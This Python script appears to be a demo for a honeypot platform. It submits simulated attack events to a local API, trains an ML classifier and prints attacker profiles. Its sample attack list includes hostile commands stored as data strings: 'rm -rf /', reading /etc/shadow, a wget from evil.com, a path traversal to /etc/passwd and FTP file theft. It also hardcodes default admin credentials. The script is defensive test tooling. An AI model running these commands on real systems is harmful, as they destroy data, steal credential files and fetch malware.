#!/usr/bin/env python3
"""
HoneyCloud  ·  Attack Simulation & Demo Script
=================================================
Standalone script that exercises the full API pipeline end-to-end:
  1. Authenticate and obtain a JWT
  2. Submit varied attack events via /ingest
  3. Trigger the built-in simulation endpoint
  4. Train the ML model on the generated data
  5. Print a summary of captured events and attacker profiles
    6. (Optional) Generate a report (csv/xlsx/txt)

Usage:
    python simulate_attacks.py [--host HOST] [--port PORT] [--count N] [--report] [--report-format csv|xlsx|txt]

Quick Examples:
    python simulate_attacks.py --count 50
    python simulate_attacks.py --report --report-format xlsx
    python simulate_attacks.py --host 127.0.0.1 --port 8000 --user admin --password admin123
"""
import argparse
import random
import sys
import time

try:
    import requests
except ImportError:
    print("❌  'requests' not installed – run: pip install requests")
    sys.exit(1)

# ── Colour helpers ────────────────────────────────────────────────────────────
R = "\033[0;31m"; G = "\033[0;32m"; Y = "\033[0;33m"
C = "\033[0;36m"; B = "\033[1m"; RESET = "\033[0m"

def ok(s):  print(f"{G}✓  {s}{RESET}")
def err(s): print(f"{R}✗  {s}{RESET}")
def info(s):print(f"{C}→  {s}{RESET}")
def head(s):print(f"\n{B}{s}{RESET}")


# ── Sample attack templates ───────────────────────────────────────────────────
ATTACKS = [
    # (service, severity, label, score, username, password, command, description)
    ("SSH",  "CRITICAL", "malicious", 0.96, "root",      "toor",       "rm -rf /",               "destructive cmd"),
    ("SSH",  "CRITICAL", "malicious", 0.94, "admin",     "admin",      "cat /etc/shadow",         "shadow file read"),
    ("SSH",  "CRITICAL", "malicious", 0.92, "root",      "password",   "wget http://evil.com/sh", "malware download"),
    ("SSH",  "HIGH",     "malicious", 0.87, "admin",     "admin123",   "sudo su -",               "priv escalation"),
    ("SSH",  "HIGH",     "anomaly",   0.83, "pi",        "raspberry",  "netstat -tulpn",          "recon command"),
    ("HTTP", "CRITICAL", "malicious", 0.91, "anonymous", "",           "GET /../../../etc/passwd", "path traversal"),
    ("HTTP", "HIGH",     "malicious", 0.88, "anonymous", "",           "POST /admin/login",       "admin brute"),
    ("HTTP", "HIGH",     "anomaly",   0.79, "anonymous", "",           "GET /.env",               "env file probe"),
    ("HTTP", "MEDIUM",   "anomaly",   0.64, "anonymous", "",           "GET /wp-admin",           "cms scan"),
    ("HTTP", "MEDIUM",   "anomaly",   0.61, "anonymous", "",           "GET /phpmyadmin",         "db scan"),
    ("FTP",  "HIGH",     "malicious", 0.84, "anonymous", "anonymous@", "STOR malware.sh",         "file upload attempt"),
    ("FTP",  "HIGH",     "anomaly",   0.78, "admin",     "admin",      "RETR /etc/passwd",        "file steal attempt"),
    ("FTP",  "MEDIUM",   "anomaly",   0.55, "ftpuser",   "ftpuser",    "LIST /",                  "dir listing"),
    ("SSH",  "LOW",      "benign",    0.22, "testuser",  "test",       "ls",                      "benign ls"),
    ("HTTP", "LOW",      "benign",    0.18, "anonymous", "",           "GET /",                   "benign GET"),
]

ATTACKER_IPS = [
    "45.33.32.156",    # Shodan scanner
    "185.220.101.45",  # Tor exit node
    "92.63.196.38",    # Known scanner
    "94.102.49.193",   # Botnet node
    "103.21.58.23",    # Asian scanner
]


class HoneyCloudClient:
    def __init__(self, base_url: str):
        self.base = base_url.rstrip("/")
        self.session = requests.Session()
        self.token = ""

    def login(self, username="admin", password="admin123") -> bool:
        r = self.session.post(
            f"{self.base}/api/v1/auth/login",
            data={"username": username, "password": password},
            timeout=10,
        )
        if not r.ok:
            err(f"Login failed: {r.status_code} {r.text[:200]}")
            return False
        data = r.json()
        self.token = data["access_token"]
        self.session.headers["Authorization"] = f"Bearer {self.token}"
        ok(f"Logged in as '{data['username']}' (role: {data['role']})")
        return True

    def ingest(self, payload: dict) -> dict | None:
        r = self.session.post(f"{self.base}/api/v1/events/ingest", json=payload, timeout=10)
        r.raise_for_status()
        return r.json()

    def simulate(self, count: int = 30) -> dict:
        r = self.session.post(f"{self.base}/api/v1/simulate/?count={count}", timeout=120)
        r.raise_for_status()
        return r.json()

    def get_stats(self) -> dict:
        r = self.session.get(f"{self.base}/api/v1/stats/", timeout=10)
        r.raise_for_status()
        return r.json()

    def get_summary(self) -> dict:
        r = self.session.get(f"{self.base}/api/v1/analytics/summary", timeout=10)
        r.raise_for_status()
        return r.json()

    def get_profiles(self, limit: int = 10) -> list:
        r = self.session.get(f"{self.base}/api/v1/profiles/?limit={limit}", timeout=10)
        r.raise_for_status()
        return r.json()

    def get_credentials(self) -> dict:
        r = self.session.get(f"{self.base}/api/v1/analytics/credentials?limit=5", timeout=10)
        r.raise_for_status()
        return r.json()

    def train_ml(self) -> dict:
        r = self.session.post(f"{self.base}/api/v1/ml/train", timeout=60)
        r.raise_for_status()
        return r.json()

    def ml_status(self) -> dict:
        r = self.session.get(f"{self.base}/api/v1/ml/status", timeout=10)
        r.raise_for_status()
        return r.json()

    def generate_report(self, fmt: str = "xlsx") -> dict:
        r = self.session.post(f"{self.base}/api/v1/reports/generate?fmt={fmt}", timeout=120)
        r.raise_for_status()
        return r.json()


def run_simulation(client: HoneyCloudClient, count: int, report: bool, report_format: str):
    head("═══  Phase 1: Direct Attack Injection  ═══")
    info(f"Injecting {len(ATTACKS)} attack templates using random source IPs from a pool of {len(ATTACKER_IPS)}…")

    injected = 0
    for attack in ATTACKS:
        svc, sev, label, score, user, pwd, cmd, desc = attack
        ip = random.choice(ATTACKER_IPS)
        payload = {
            "service":      svc,
            "source_ip":    ip,
            "source_port":  random.randint(1024, 65535),
            "username":     user,
            "password":     pwd,
            "command":      cmd,
            "severity":     sev,
            "ai_label":     label,
            "threat_score": score,
            "method":       "POST" if svc == "HTTP" else "COMMAND",
        }
        try:
            client.ingest(payload)
            injected += 1
            print(f"  {sev:8s} │ {svc:4s} │ {ip:16s} │ {desc}")
            time.sleep(0.05)
        except Exception as e:
            print(f"  {R}FAIL{RESET}  │ {svc} │ {e}")

    ok(f"Injected {injected}/{len(ATTACKS)} events")

    head("═══  Phase 2: Bulk Simulation Endpoint  ═══")
    info(f"Generating {count} random events via /simulate…")
    result = client.simulate(count)
    ok(f"Generated {result.get('total_new', 0)} events")
    bd = result.get("breakdown", {})
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        bar = "█" * bd.get(sev, 0)
        print(f"  {sev:8s} {bar} {bd.get(sev, 0)}")

    head("═══  Phase 3: ML Model Training  ═══")
    ml_stat = client.ml_status()
    if ml_stat.get("is_trained"):
        info("Model already trained – skipping re-train")
    else:
        info("Training Keras LSTM model on captured events…")
        try:
            train_result = client.train_ml()
            ok(f"Trained on {train_result.get('trained_on', '?')} events")
        except Exception as e:
            print(f"  {Y}⚠  ML train skipped (need ≥50 events): {e}{RESET}")

    head("═══  Phase 4: Results Summary  ═══")
    summary = client.get_summary()
    stats   = client.get_stats()

    print(f"\n  {'Metric':<28} {'Value':>12}")
    print(f"  {'─'*40}")
    print(f"  {'Total events':<28} {summary.get('total_events', 0):>12,}")
    print(f"  {'Unique attacking IPs':<28} {summary.get('unique_attackers', 0):>12,}")
    print(f"  {'Critical events':<28} {summary.get('critical_total', 0):>12,}")
    print(f"  {'ML-classified malicious':<28} {summary.get('malicious_total', 0):>12,}")
    print(f"  {'Avg threat score':<28} {summary.get('avg_threat_score', 0):>12.3f}")

    svc = stats.get("events_by_service", {})
    if svc:
        print(f"\n  {'Service':<12} Events")
        print(f"  {'─'*24}")
        for s, n in sorted(svc.items(), key=lambda x: -x[1]):
            print(f"  {s:<12} {n:>6,}")

    head("═══  Phase 5: Top Attacker Profiles  ═══")
    profiles = client.get_profiles(10)
    if profiles:
        print(f"\n  {'IP':<18} {'Events':>7} {'Risk':<10} {'Patterns'}")
        print(f"  {'─'*60}")
        for p in profiles[:8]:
            flags = []
            if p.get("brute_force_detected"):         flags.append("BF")
            if p.get("scanner_detected"):             flags.append("SC")
            t = p.get("risk_tier", "?")
            col = R if t in ("CRITICAL","BLOCKED") else Y if t == "HIGH" else C if t == "MEDIUM" else RESET
            print(f"  {p['ip_address']:<18} {p['total_events']:>7,} {col}{t:<10}{RESET} {' '.join(flags)}")

    head("═══  Phase 6: Credential Intelligence  ═══")
    creds = client.get_credentials()
    top_u = creds.get("top_usernames", [])[:5]
    top_p = creds.get("top_passwords", [])[:5]
    if top_u:
        print(f"\n  Top Usernames:")
        for u in top_u:
            print(f"    {u.get('username','?'):<20} {u.get('attempts',0):>4}x")
    if top_p:
        print(f"\n  Top Passwords:")
        for p in top_p:
            print(f"    {p.get('password','?'):<20} {p.get('attempts',0):>4}x")

    if report:
        head("═══  Phase 7: Report Generation  ═══")
        info(f"Generating {report_format.upper()} report…")
        try:
            rep = client.generate_report(report_format)
            ok(f"Report: {rep.get('filepath', '?')}  ({rep.get('events_count', 0)} events)")
            print(f"  Download: {rep.get('download_url', '')}")
        except Exception as e:
            print(f"  {Y}⚠  Report generation failed: {e}{RESET}")

    head("═══  Done  ═══")
    print(f"\n  {G}Dashboard{RESET} → http://localhost:80")
    print(f"  {G}API Docs {RESET} → http://localhost:8000/docs")
    print(f"  {G}WS Feed  {RESET} → ws://localhost:8000/api/v1/events/ws?token=<jwt>")
    print()


def main():
    parser = argparse.ArgumentParser(description="HoneyCloud-X attack simulation demo")
    parser.add_argument("--host", default="localhost", help="API hostname (default: localhost)")
    parser.add_argument("--port", default=8000, type=int, help="API port (default: 8000)")
    parser.add_argument("--count", default=30, type=int, help="Bulk simulation count (default: 30)")
    parser.add_argument("--report", action="store_true", help="Generate report at end")
    parser.add_argument("--report-format", default="csv", choices=["csv", "xlsx", "txt"],
                        help="Report format when --report is set (default: csv)")
    parser.add_argument("--user", default="admin", help="Login username")
    parser.add_argument("--password", default="admin123", help="Login password")
    args = parser.parse_args()

    base_url = f"http://{args.host}:{args.port}"
    print(f"\n{B}HoneyCloud-X  ·  Attack Simulation Demo{RESET}")
    print(f"{C}Target: {base_url}{RESET}\n")

    client = HoneyCloudClient(base_url)

    # Check API is up
    try:
        r = requests.get(f"{base_url}/health", timeout=5)
        r.raise_for_status()
        ok("API is reachable")
    except Exception:
        err(f"Cannot reach API at {base_url} – is it running?\n  docker compose up  OR  make dev")
        sys.exit(1)

    if not client.login(args.user, args.password):
        sys.exit(1)

    run_simulation(client, count=args.count, report=args.report, report_format=args.report_format)


if __name__ == "__main__":
    main()
